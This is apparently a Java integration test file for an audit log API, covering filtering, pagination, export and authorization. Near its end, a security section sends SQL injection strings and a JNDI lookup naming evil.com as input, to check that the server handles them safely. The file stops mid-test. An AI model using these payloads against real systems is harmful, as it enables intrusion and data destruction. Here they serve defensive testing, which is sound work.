/*
 *  Copyright 2021 Collate
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *  http://www.apache.org/licenses/LICENSE-2.0
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

package org.openmetadata.it.tests;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.fail;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.util.HashMap;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.parallel.Execution;
import org.junit.jupiter.api.parallel.ExecutionMode;
import org.openmetadata.it.util.SdkClients;
import org.openmetadata.sdk.client.OpenMetadataClient;
import org.openmetadata.sdk.network.HttpMethod;
import org.openmetadata.sdk.network.RequestOptions;

/**
 * Integration tests for Audit Log Resource endpoints.
 *
 * <p>Tests the audit log listing API with various filter combinations. These tests are designed to
 * run in parallel.
 *
 * <p>Note: Audit logs are populated asynchronously by the AuditLogConsumer, so tests focus on API
 * contract validation rather than specific event timing.
 */
@Execution(ExecutionMode.CONCURRENT)
public class AuditLogResourceIT {

  private static final ObjectMapper MAPPER = new ObjectMapper();
  private static final String AUDIT_LOGS_PATH = "/v1/audit/logs";

  @Test
  void test_listAuditLogs_asAdmin_returnsResults() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    String response = executeGet(client, AUDIT_LOGS_PATH, null);

    assertNotNull(response, "Response should not be null");

    // Parse as generic map to check structure
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"), "Response should contain 'data' field");
    assertNotNull(result.get("paging"), "Response should contain 'paging' field");
  }

  @Test
  void test_listAuditLogs_withLimitParameter() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("limit", "5");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withUserNameFilter() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("userName", "admin");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withActorTypeFilter() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("actorType", "USER");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withEntityTypeFilter() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("entityType", "table");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withEventTypeFilter() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("eventType", "entityCreated");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withTimeRangeFilter() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    long now = System.currentTimeMillis();
    long oneHourAgo = now - (60 * 60 * 1000);

    Map<String, String> params = new HashMap<>();
    params.put("startTs", String.valueOf(oneHourAgo));
    params.put("endTs", String.valueOf(now));
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withMultipleFilters() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("actorType", "USER");
    params.put("entityType", "table");
    params.put("eventType", "entityCreated");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withPagination() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    // First page
    Map<String, String> params = new HashMap<>();
    params.put("limit", "5");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));

    // Check if there's pagination info
    Map<String, Object> paging = (Map<String, Object>) result.get("paging");
    assertNotNull(paging);

    // If there's an 'after' cursor, try fetching next page
    String afterCursor = (String) paging.get("after");
    if (afterCursor != null && !afterCursor.isEmpty()) {
      params.put("after", afterCursor);
      String nextPageResponse = executeGet(client, AUDIT_LOGS_PATH, params);
      assertNotNull(nextPageResponse);
    }
  }

  @Test
  void test_listAuditLogs_withBackwardPagination() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    // First, get first page to get an 'after' cursor
    Map<String, String> params = new HashMap<>();
    params.put("limit", "5");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    assertNotNull(response);

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    Map<String, Object> paging = (Map<String, Object>) result.get("paging");
    assertNotNull(paging);

    String afterCursor = (String) paging.get("after");
    if (afterCursor != null && !afterCursor.isEmpty()) {
      // Get second page
      params.put("after", afterCursor);
      params.remove("before");
      String secondPageResponse = executeGet(client, AUDIT_LOGS_PATH, params);
      assertNotNull(secondPageResponse);

      Map<String, Object> secondResult =
          MAPPER.readValue(secondPageResponse, new TypeReference<>() {});
      Map<String, Object> secondPaging = (Map<String, Object>) secondResult.get("paging");

      // Now try backward pagination using 'before' cursor
      String beforeCursor = (String) secondPaging.get("before");
      if (beforeCursor != null && !beforeCursor.isEmpty()) {
        params.remove("after");
        params.put("before", beforeCursor);
        String previousPageResponse = executeGet(client, AUDIT_LOGS_PATH, params);
        assertNotNull(previousPageResponse);

        Map<String, Object> previousResult =
            MAPPER.readValue(previousPageResponse, new TypeReference<>() {});
        assertNotNull(previousResult.get("data"));
      }
    }
  }

  @Test
  void test_listAuditLogs_withEntityFQNFilter() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("entityFQN", "sample_data.ecommerce_db.shopify.raw_product_catalog");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withSpecialCharactersInSearch() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("q", "test@example.com");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withServiceNameFilter() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("serviceName", "sample_data");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_maxLimitRejected() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    // Request more than max (200) - server should reject
    Map<String, String> params = new HashMap<>();
    params.put("limit", "500");

    try {
      executeGet(client, AUDIT_LOGS_PATH, params);
      // If no exception, the server accepted it (which is also valid behavior)
    } catch (Exception e) {
      // Expected - server rejects limit > 200
      assertTrue(
          e.getMessage().contains("200") || e.getMessage().contains("limit"),
          "Should fail with limit validation error");
    }
  }

  @Test
  void test_listAuditLogs_invalidActorType_returnsEmptyOrValid() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("actorType", "INVALID_TYPE");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    // Should return valid response (empty data or no match)
    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_asNonAdmin_accessBehavior() throws Exception {
    // Test user access to audit logs - behavior depends on configured permissions
    OpenMetadataClient client = SdkClients.testUserClient();

    try {
      String response = executeGet(client, AUDIT_LOGS_PATH, null);
      // If we get here, the user has audit log permissions - verify valid response
      assertNotNull(response);
      Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
      assertNotNull(result.get("data"), "Response should contain 'data' field when authorized");
    } catch (Exception e) {
      // If access is denied, verify it's a proper authorization error
      assertTrue(
          e.getMessage().contains("403")
              || e.getMessage().contains("not authorized")
              || e.getMessage().contains("not allowed"),
          "Access denial should be an authorization error, got: " + e.getMessage());
    }
  }

  @Test
  void test_listAuditLogs_withEntityCreatedFilter() throws Exception {
    // Verify audit log API works with entityType and eventType filters
    // Note: Audit logs are populated asynchronously by the consumer, so we test
    // the API contract works correctly rather than specific entity creation events
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("entityType", "table");
    params.put("eventType", "entityCreated");
    params.put("limit", "50");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    assertNotNull(response);

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"), "Response should contain 'data' field");
    assertNotNull(result.get("paging"), "Response should contain 'paging' field");
  }

  @Test
  void test_listAuditLogs_withSearchQuery() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("q", "admin");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"), "Response should contain 'data' field");
  }

  @Test
  void test_listAuditLogs_withEmptySearchQuery() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("q", "");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"), "Response should contain 'data' field");
  }

  @Test
  void test_listAuditLogs_withSearchAndFilters() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("q", "table");
    params.put("entityType", "table");
    params.put("actorType", "USER");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"), "Response should contain 'data' field");
  }

  @Test
  void test_auditLogEntry_containsExpectedFields() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("limit", "1");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    assertNotNull(response);

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    java.util.List<Map<String, Object>> data =
        (java.util.List<Map<String, Object>>) result.get("data");

    if (data != null && !data.isEmpty()) {
      Map<String, Object> entry = data.get(0);

      // Verify expected fields are present in audit log entry
      assertTrue(entry.containsKey("id") || entry.containsKey("changeEventId"));
      assertTrue(entry.containsKey("eventTs"));
      assertTrue(entry.containsKey("eventType"));
      assertTrue(entry.containsKey("userName") || entry.containsKey("actorType"));
    }
  }

  @Test
  void test_exportAuditLogs_asAdmin_returnsJobId() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    long now = System.currentTimeMillis();
    long oneWeekAgo = now - (7 * 24 * 60 * 60 * 1000);

    Map<String, String> params = new HashMap<>();
    params.put("startTs", String.valueOf(oneWeekAgo));
    params.put("endTs", String.valueOf(now));

    String response = executeGet(client, AUDIT_LOGS_PATH + "/export", params);

    assertNotNull(response, "Response should not be null");

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("jobId"), "Response should contain 'jobId' field");
    assertNotNull(result.get("message"), "Response should contain 'message' field");
  }

  @Test
  void test_exportAuditLogs_withoutDateRange_returnsBadRequest() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();

    try {
      executeGet(client, AUDIT_LOGS_PATH + "/export", params);
      fail("Export without date range should fail");
    } catch (Exception e) {
      assertTrue(
          e.getMessage().contains("400")
              || e.getMessage().contains("startTs and endTs are required"),
          "Should fail with bad request error when date range is missing, got: " + e.getMessage());
    }
  }

  @Test
  void test_exportAuditLogs_withOnlyStartTs_returnsBadRequest() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    long now = System.currentTimeMillis();
    long oneWeekAgo = now - (7 * 24 * 60 * 60 * 1000);

    Map<String, String> params = new HashMap<>();
    params.put("startTs", String.valueOf(oneWeekAgo));

    try {
      executeGet(client, AUDIT_LOGS_PATH + "/export", params);
      fail("Export with only startTs should fail");
    } catch (Exception e) {
      assertTrue(
          e.getMessage().contains("400")
              || e.getMessage().contains("startTs and endTs are required"),
          "Should fail with bad request error when endTs is missing, got: " + e.getMessage());
    }
  }

  @Test
  void test_exportAuditLogs_withOnlyEndTs_returnsBadRequest() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    long now = System.currentTimeMillis();

    Map<String, String> params = new HashMap<>();
    params.put("endTs", String.valueOf(now));

    try {
      executeGet(client, AUDIT_LOGS_PATH + "/export", params);
      fail("Export with only endTs should fail");
    } catch (Exception e) {
      assertTrue(
          e.getMessage().contains("400")
              || e.getMessage().contains("startTs and endTs are required"),
          "Should fail with bad request error when startTs is missing, got: " + e.getMessage());
    }
  }

  @Test
  void test_exportAuditLogs_startTsAfterEndTs_returnsBadRequest() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    long now = System.currentTimeMillis();
    long future = now + (24 * 60 * 60 * 1000);

    Map<String, String> params = new HashMap<>();
    params.put("startTs", String.valueOf(future));
    params.put("endTs", String.valueOf(now));

    try {
      executeGet(client, AUDIT_LOGS_PATH + "/export", params);
      // Server should reject request with invalid time range
    } catch (Exception e) {
      assertTrue(
          e.getMessage().contains("400") || e.getMessage().contains("startTs"),
          "Should fail with bad request error for invalid time range");
    }
  }

  @Test
  void test_exportAuditLogs_asNonAdmin_forbidden() throws Exception {
    OpenMetadataClient client = SdkClients.testUserClient();

    long now = System.currentTimeMillis();
    long oneWeekAgo = now - (7 * 24 * 60 * 60 * 1000);

    Map<String, String> params = new HashMap<>();
    params.put("startTs", String.valueOf(oneWeekAgo));
    params.put("endTs", String.valueOf(now));

    try {
      executeGet(client, AUDIT_LOGS_PATH + "/export", params);
      // If we get here, the test user unexpectedly has admin permissions
    } catch (Exception e) {
      assertTrue(
          e.getMessage().contains("403")
              || e.getMessage().contains("not authorized")
              || e.getMessage().contains("not allowed"),
          "Non-admin export should be denied, got: " + e.getMessage());
    }
  }

  @Test
  void test_exportAuditLogs_withFilters() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    long now = System.currentTimeMillis();
    long oneWeekAgo = now - (7 * 24 * 60 * 60 * 1000);

    Map<String, String> params = new HashMap<>();
    params.put("startTs", String.valueOf(oneWeekAgo));
    params.put("endTs", String.valueOf(now));
    params.put("entityType", "table");
    params.put("actorType", "USER");
    params.put("limit", "100");

    String response = executeGet(client, AUDIT_LOGS_PATH + "/export", params);

    assertNotNull(response, "Response should not be null");

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("jobId"), "Response should contain 'jobId' field");
  }

  @Test
  void test_listAuditLogs_withBotActorType() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("actorType", "BOT");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withEntityDeletedFilter() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("eventType", "entityDeleted");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withEntityUpdatedFilter() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("eventType", "entityUpdated");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withDatabaseEntityType() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("entityType", "database");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_withUserEntityType() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("entityType", "user");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_orderByTimestamp() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);

    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    java.util.List<Map<String, Object>> data =
        (java.util.List<Map<String, Object>>) result.get("data");

    if (data != null && data.size() > 1) {
      Long prevTimestamp = null;
      for (Map<String, Object> entry : data) {
        Long currentTs = ((Number) entry.get("eventTs")).longValue();
        if (prevTimestamp != null) {
          assertTrue(
              currentTs <= prevTimestamp, "Events should be ordered by timestamp descending");
        }
        prevTimestamp = currentTs;
      }
    }
  }

  @Test
  void test_exportAuditLogs_withSearchQuery() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    long now = System.currentTimeMillis();
    long oneWeekAgo = now - (7 * 24 * 60 * 60 * 1000);

    Map<String, String> params = new HashMap<>();
    params.put("startTs", String.valueOf(oneWeekAgo));
    params.put("endTs", String.valueOf(now));
    params.put("q", "admin");

    String response = executeGet(client, AUDIT_LOGS_PATH + "/export", params);

    assertNotNull(response, "Response should not be null");

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("jobId"), "Response should contain 'jobId' field");
  }

  // ==================== Permission/Authorization Tests ====================

  @Test
  void test_listAuditLogs_withEntityFQNAndEntityType_entityLevelAuth() throws Exception {
    // When entityFQN AND entityType are provided, should check VIEW_BASIC on the entity
    // Non-admin users may have VIEW_BASIC on sample_data tables
    OpenMetadataClient client = SdkClients.testUserClient();

    Map<String, String> params = new HashMap<>();
    params.put("entityFQN", "sample_data.ecommerce_db.shopify.raw_product_catalog");
    params.put("entityType", "table");
    params.put("limit", "10");

    try {
      String response = executeGet(client, AUDIT_LOGS_PATH, params);
      // User with VIEW_BASIC on table should succeed
      assertNotNull(response);
      Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
      assertNotNull(result.get("data"), "Response should contain 'data' field");
    } catch (Exception e) {
      // If access denied, verify it's proper authorization error
      assertTrue(
          e.getMessage().contains("403")
              || e.getMessage().contains("not authorized")
              || e.getMessage().contains("not allowed"),
          "Should be authorization error if denied, got: " + e.getMessage());
    }
  }

  @Test
  void test_listAuditLogs_withServiceNameAndEntityType_serviceLevelAuth() throws Exception {
    // When serviceName AND entityType are provided, should check VIEW_BASIC on the service
    OpenMetadataClient client = SdkClients.testUserClient();

    Map<String, String> params = new HashMap<>();
    params.put("serviceName", "sample_data");
    params.put("entityType", "table");
    params.put("limit", "10");

    try {
      String response = executeGet(client, AUDIT_LOGS_PATH, params);
      // If user has VIEW_BASIC on service, should succeed
      assertNotNull(response);
      Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
      assertNotNull(result.get("data"), "Response should contain 'data' field");
    } catch (Exception e) {
      // If access denied, verify it's proper authorization error
      assertTrue(
          e.getMessage().contains("403")
              || e.getMessage().contains("not authorized")
              || e.getMessage().contains("not allowed"),
          "Should be authorization error if denied, got: " + e.getMessage());
    }
  }

  @Test
  void test_listAuditLogs_asNonAdmin_globalAccess_behaviorDependsOnPermissions() throws Exception {
    // Non-admin user without global AUDIT_LOGS permission should be denied for unfiltered access
    // If they have permission, they should get a valid response
    OpenMetadataClient client = SdkClients.testUserClient();

    Map<String, String> params = new HashMap<>();
    params.put("limit", "10");

    try {
      String response = executeGet(client, AUDIT_LOGS_PATH, params);
      // If we get here, user has global audit log access - verify valid response
      assertNotNull(response);
      Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
      assertNotNull(result.get("data"), "Response should contain 'data' field when authorized");
    } catch (Exception e) {
      // If access denied, verify it's proper authorization error
      assertTrue(
          e.getMessage().contains("403")
              || e.getMessage().contains("not authorized")
              || e.getMessage().contains("not allowed"),
          "Non-admin without global AUDIT_LOGS permission should be denied, got: "
              + e.getMessage());
    }
  }

  @Test
  void test_listAuditLogs_withOnlyEntityType_behaviorDependsOnPermissions() throws Exception {
    // When only entityType is provided (without entityFQN or serviceName),
    // behavior depends on user's global AUDIT_LOGS permission
    OpenMetadataClient client = SdkClients.testUserClient();

    Map<String, String> params = new HashMap<>();
    params.put("entityType", "table");
    params.put("limit", "10");

    try {
      String response = executeGet(client, AUDIT_LOGS_PATH, params);
      // If we get here, user has global access - verify valid response
      assertNotNull(response);
      Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
      assertNotNull(result.get("data"), "Response should contain 'data' field when authorized");
    } catch (Exception e) {
      // If access denied, verify it's proper authorization error
      assertTrue(
          e.getMessage().contains("403")
              || e.getMessage().contains("not authorized")
              || e.getMessage().contains("not allowed"),
          "Should require global permission when only entityType is provided, got: "
              + e.getMessage());
    }
  }

  @Test
  void test_listAuditLogs_withOnlyServiceName_behaviorDependsOnPermissions() throws Exception {
    // When only serviceName is provided (without entityType),
    // behavior depends on user's global AUDIT_LOGS permission
    OpenMetadataClient client = SdkClients.testUserClient();

    Map<String, String> params = new HashMap<>();
    params.put("serviceName", "sample_data");
    params.put("limit", "10");

    try {
      String response = executeGet(client, AUDIT_LOGS_PATH, params);
      // If we get here, user has global access - verify valid response
      assertNotNull(response);
      Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
      assertNotNull(result.get("data"), "Response should contain 'data' field when authorized");
    } catch (Exception e) {
      // If access denied, verify it's proper authorization error
      assertTrue(
          e.getMessage().contains("403")
              || e.getMessage().contains("not authorized")
              || e.getMessage().contains("not allowed"),
          "Should require global permission when only serviceName is provided, got: "
              + e.getMessage());
    }
  }

  @Test
  void test_exportAuditLogs_asNonAdmin_behaviorDependsOnPermissions() throws Exception {
    // Export requires global AUDIT_LOGS permission
    // Non-admin behavior depends on their configured permissions
    OpenMetadataClient client = SdkClients.testUserClient();

    long now = System.currentTimeMillis();
    long oneWeekAgo = now - (7 * 24 * 60 * 60 * 1000);

    Map<String, String> params = new HashMap<>();
    params.put("startTs", String.valueOf(oneWeekAgo));
    params.put("endTs", String.valueOf(now));

    try {
      String response = executeGet(client, AUDIT_LOGS_PATH + "/export", params);
      // If we get here, user has export permission - verify valid response
      assertNotNull(response);
      Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
      assertNotNull(result.get("jobId"), "Response should contain 'jobId' field when authorized");
    } catch (Exception e) {
      // If access denied, verify it's proper authorization error
      assertTrue(
          e.getMessage().contains("403")
              || e.getMessage().contains("not authorized")
              || e.getMessage().contains("not allowed"),
          "Non-admin without export permission should be denied, got: " + e.getMessage());
    }
  }

  // ==================== Security Tests ====================

  @Test
  void test_listAuditLogs_sqlInjectionInSearchTerm_handled() throws Exception {
    // Verify SQL injection attempts in search term don't cause errors
    OpenMetadataClient client = SdkClients.adminClient();

    String[] sqlInjectionPayloads = {
      "'; DROP TABLE audit_log; --",
      "1' OR '1'='1",
      "admin'--",
      "1; SELECT * FROM users; --",
      "' UNION SELECT * FROM audit_log --",
      "admin\" OR \"1\"=\"1",
      "1' AND SLEEP(5)--",
      "${jndi:ldap://evil.com/a}",
      "{{7*7}}"
    };

    for (String payload : sqlInjectionPayloads) {
      Map<String, String> params = new HashMap<>();
      params.put("q", payload);
      params.put("limit", "5");

      try {
        String response = executeGet(client, AUDIT_LOGS_PATH, params);
        // Should get a valid response (possibly empty), not an error
        assertNotNull(response, "Response should not be null for payload: " + payload);
        Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
        assertNotNull(result.get("data"), "Should return valid data structure for: " + payload);
      } catch (Exception e) {
        // Should not throw SQL errors - only business logic errors are acceptable
        assertTrue(
            !e.getMessage().toLowerCase().contains("sql")
                && !e.getMessage().toLowerCase().contains("syntax")
                && !e.getMessage().toLowerCase().contains("query"),
            "SQL injection payload should not cause SQL error: "
                + payload
                + ", got: "
                + e.getMessage());
      }
    }
  }

  @Test
  void test_listAuditLogs_sqlInjectionInUserName_handled() throws Exception {
    // Verify SQL injection attempts in userName filter don't cause errors
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("userName", "admin'; DROP TABLE audit_log; --");
    params.put("limit", "5");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    // Should get a valid response (possibly empty), not an error
    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  @Test
  void test_listAuditLogs_sqlInjectionInEntityFQN_handled() throws Exception {
    // Verify SQL injection attempts in entityFQN filter don't cause errors
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("entityFQN", "'; DROP TABLE audit_log; --");
    params.put("entityType", "table");
    params.put("limit", "5");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    // Should get a valid response (possibly empty), not an error
    assertNotNull(response);
    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));
  }

  // ==================== Audit Log Event Verification Tests ====================
  // These tests verify that audit log entries are created with valid UUIDs for all event types.
  // They catch bugs where JDBI @BindBean doesn't properly convert UUID to String.

  private static final long AUDIT_LOG_TIMEOUT_MS = 60000;
  private static final long AUDIT_LOG_POLL_INTERVAL_MS = 1000;

  @Test
  void test_auditLog_entityCreated_hasValidUUIDs() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    // Create a glossary
    String glossaryName =
        "AuditLogCreateTest_" + java.util.UUID.randomUUID().toString().substring(0, 8);
    String createJson =
        String.format(
            "{\"name\": \"%s\", \"displayName\": \"Test Glossary\", \"description\": \"Test for entityCreated audit\"}",
            glossaryName);

    String createResponse =
        client
            .getHttpClient()
            .executeForString(
                HttpMethod.POST, "/v1/glossaries", createJson, RequestOptions.builder().build());
    Map<String, Object> glossary = MAPPER.readValue(createResponse, new TypeReference<>() {});
    String glossaryId = glossary.get("id").toString();
    String glossaryFqn = glossary.get("fullyQualifiedName").toString();

    try {
      // Verify entityCreated audit log entry
      Map<String, Object> auditEntry =
          waitForAuditLogEntry(client, glossaryFqn, "glossary", "entityCreated");
      assertNotNull(auditEntry, "entityCreated audit log entry should exist for: " + glossaryFqn);
      verifyAuditEntryHasValidUUIDs(auditEntry, glossaryId);
      assertEquals("entityCreated", auditEntry.get("eventType"));
    } finally {
      deleteGlossary(client, glossaryId);
    }
  }

  @Test
  void test_auditLog_entityUpdated_hasValidUUIDs() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    // Create a glossary
    String glossaryName =
        "AuditLogUpdateTest_" + java.util.UUID.randomUUID().toString().substring(0, 8);
    String createJson =
        String.format(
            "{\"name\": \"%s\", \"displayName\": \"Test Glossary\", \"description\": \"Original description\"}",
            glossaryName);

    String createResponse =
        client
            .getHttpClient()
            .executeForString(
                HttpMethod.POST, "/v1/glossaries", createJson, RequestOptions.builder().build());
    Map<String, Object> glossary = MAPPER.readValue(createResponse, new TypeReference<>() {});
    String glossaryId = glossary.get("id").toString();
    String glossaryFqn = glossary.get("fullyQualifiedName").toString();

    try {
      // Wait for create event first
